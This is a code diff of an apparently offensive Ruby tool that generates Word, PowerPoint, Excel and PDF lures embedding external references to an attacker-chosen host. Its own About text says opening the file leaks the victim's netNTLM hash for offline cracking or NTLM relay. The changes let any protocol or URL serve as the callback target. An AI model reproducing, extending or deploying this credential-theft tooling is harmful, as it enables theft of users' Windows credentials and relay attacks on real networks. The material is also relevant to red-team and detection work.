@@ -10,6 +10,7 @@ $xls_template = "UEsDBBQAAAAIAAAAIQB/0CPuVwEAAP0EAAATABwAW0NvbnRlbnRfVHlwZXNdLnh
 $pdf_template = "CiVQREYtMS43CgoxIDAgb2JqCjw8L1R5cGUvQ2F0YWxvZy9QYWdlcyAyIDAgUj4+CmVuZG9iagoyIDAgb2JqCjw8L1R5cGUvUGFnZXMvS2lkc1szIDAgUl0vQ291bnQgMT4+CmVuZG9iagozIDAgb2JqCjw8L1R5cGUvUGFnZS9QYXJlbnQgMiAwIFIvTWVkaWFCb3hbMCAwIDYxMiA3OTJdL1Jlc291cmNlczw8Pj4+PgplbmRvYmoKeHJlZgowIDQKMDAwMDAwMDAwMCA2NTUzNSBmCjAwMDAwMDAwMTUgMDAwMDAgbgowMDAwMDAwMDYwIDAwMDAwIG4KMDAwMDAwMDExMSAwMDAwMCBuCnRyYWlsZXIKPDwvU2l6ZSA0L1Jvb3QgMSAwIFI+PgpzdGFydHhyZWYKMTkwCjMgMCBvYmoKPDwgL1R5cGUgL1BhZ2UKICAgL0NvbnRlbnRzIDQgMCBSCgogICAvQUEgPDwKCSAgIC9PIDw8CgkgICAgICAvRiAoXFxcXHRhcmdldFxcQWRvYmVQbHVnaW4pCgkJICAvRCBbIDAgL0ZpdF0KCQkgIC9TIC9Hb1RvUgoJCSAgPj4KCgkgICA+PgoKCSAgIC9QYXJlbnQgMiAwIFIKCSAgIC9SZXNvdXJjZXMgPDwKCQkJL0ZvbnQgPDwKCQkJCS9GMSA8PAoJCQkJCS9UeXBlIC9Gb250CgkJCQkJL1N1YnR5cGUgL1R5cGUxCgkJCQkJL0Jhc2VGb250IC9IZWx2ZXRpY2EKCQkJCQk+PgoJCQkJICA+PgoJCQkJPj4KPj4KZW5kb2JqCgoKNCAwIG9iajw8IC9MZW5ndGggMTAwPj4Kc3RyZWFtCkJUCi9USV8wIDEgVGYKMTQgMCAwIDE0IDEwLjAwMCA3NTMuOTc2IFRtCjAuMCAwLjAgMC4wIHJnCihFcnJvciBsb2FkaW5nIHBsdWdpbikgVGoKRVQKZW5kc3RyZWFtCmVuZG9iagoKCnRyYWlsZXIKPDwKCS9Sb290IDEgMCBSCj4+CgolJUVPRgo="
 $destination = "#{$temp}/t2/"
 
+$prompt = "\nEnter protocol and target ip or hostname. e.g. file://ip, http://host.somewhere.com/file.html\n\nTarget: "
 
 def write_file(base64,source_file)
   content = base64
@@ -55,38 +56,38 @@ def replace(file_name,old_string,new_string)
 end
 
 def word()
-  print yellow("Enter target IP: ")
+  print yellow($prompt)
   ip = gets.chomp
   $template_filename = "Thief.docx"
   source_file = "#{$temp}/#{$template_filename}"
   write_file($template,source_file)
   FileUtils.rm_rf($destination)
   extract_zip(source_file, $destination)
-  replace("#{$destination}word/_rels/header1.xml.rels","Target=\"file://192.168.16.220/image1.png\"","Target=\"file://#{ip}/image1.png\"")
+  replace("#{$destination}word/_rels/header1.xml.rels","Target=\"file://192.168.16.220/image1.png\"","Target=\"#{ip}/image1.png\"")
   zip_file($destination,$template_filename)
 end
 
 def powerpoint()
-  print yellow("Enter target IP: ")
+  print yellow($prompt)
   ip = gets.chomp
   $template_filename = "Thief.pptx"
   source_file = "#{$temp}/#{$template_filename}"
   write_file($ppt_template,source_file)
   FileUtils.rm_rf($destination)
   extract_zip(source_file, $destination)
-  replace("#{$destination}ppt/slides/_rels/slide1.xml.rels","Target=\"file://192.168.16.220/image1.jpg\"","Target=\"file://#{ip}/image1.jpg\"")
+  replace("#{$destination}ppt/slides/_rels/slide1.xml.rels","Target=\"file://192.168.16.220/image1.jpg\"","Target=\"#{ip}/image1.jpg\"")
   zip_file($destination,$template_filename)
 end
 
 def excel()
-  print yellow("Enter target IP: ")
+  print yellow($prompt)
   ip = gets.chomp
   $template_filename = "Thief.xlsx"
   source_file = "#{$temp}/#{$template_filename}"
   write_file($xls_template,source_file)
   FileUtils.rm_rf($destination)
   extract_zip(source_file, $destination)
-  replace("#{$destination}xl/drawings/_rels/drawing1.xml.rels","Target=\"file://192.168.16.220/image1.jpg\"","Target=\"file://#{ip}/image1.jpg\"")
+  replace("#{$destination}xl/drawings/_rels/drawing1.xml.rels","Target=\"file://192.168.16.220/image1.jpg\"","Target=\"#{ip}/image1.jpg\"")
   zip_file($destination,$template_filename)
 end
 
@@ -96,7 +97,8 @@ end
 
 def pdf()
 print yellow("Enter target IP: ")
-  ip = integerip(gets.chomp)
+  #ip = integerip(gets.chomp)
+  ip = gets.chomp
   $template_filename = "Thief.pdf"
   write_file($pdf_template,$template_filename)
   replace("#{$template_filename}","target","#{ip}")
@@ -114,7 +116,7 @@ system "clear"
 logo = 'IF9fX19fICBfX18gIF9fX19fX19fX19fICBfX18gICAgICAgX19fICAgICAgX19fICBfX19fX19fX19fXyAgX18gICAgX18gICBfXyAgICAgX19fX19fXyAgIF9fX19fX18gIAooXCIgICBcfCIgIFwoIiAgICAgXyAgICIpfCIgIHwgICAgIHwiICBcICAgIC8iICB8KCIgICAgIF8gICAiKS8iIHwgIHwgIlwgfCIgXCAgIC8iICAgICAifCAvIiAgICAgInwgCnwuXFwgICBcICAgIHwpX18vICBcXF9fLyB8fCAgfCAgICAgIFwgICBcICAvLyAgIHwgKV9fLyAgXFxfXy8oOiAgKF9fKSAgOil8fCAgfCAoOiBfX19fX18pKDogX19fX19fKSAKfDogXC4gICBcXCAgfCAgIFxcXyAvICAgIHw6ICB8ICAgICAgL1xcICBcLy4gICAgfCAgICBcXF8gLyAgICBcLyAgICAgIFwvIHw6ICB8ICBcLyAgICB8ICAgXC8gICAgfCAgIAp8LiAgXCAgICBcLiB8ICAgfC4gIHwgICAgIFwgIHxfX18gIHw6IFwuICAgICAgICB8ICAgIHwuICB8ICAgIC8vICBfXyAgXFwgfC4gIHwgIC8vIF9fXylfICAvLyBfX18pICAgCnwgICAgXCAgICBcIHwgICBcOiAgfCAgICAoIFxffDogIFwgfC4gIFwgICAgLzogIHwgICAgXDogIHwgICAoOiAgKCAgKSAgOikvXCAgfFwoOiAgICAgICJ8KDogICggICAgICAKIFxfX198XF9fX19cKSAgICBcX198ICAgICBcX19fX19fXyl8X19ffFxfXy98X19ffCAgICAgXF9ffCAgICBcX198ICB8X18vKF9fXF98XylcX19fX19fXykgXF9fLyAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg=='
 logo = Base64.decode64(logo)
 print yellow("#{logo}\                                                                                          by 4ndr34z\n\n")
-print cyan("About:\nExfiltrates users netNTLM hash to target IP when opening the document,\neffectively stealing the hash for offline cracking.\n\nOr, the target IP could be a listening NTLMrelayx, relaying it to other resources.\n\n")
+print cyan("About:\nExfiltrates users netNTLM hash to target when opening the document,\neffectively stealing the hash for offline cracking.\n\nOr, the target IP could be a listening NTLMrelayx, relaying it to other resources.\n\nYou can also place CanaryTokens in Word, Excel and PowerPoint\n\n")
 
 puts "Please select an option:"
 puts "1. Word-Thief"
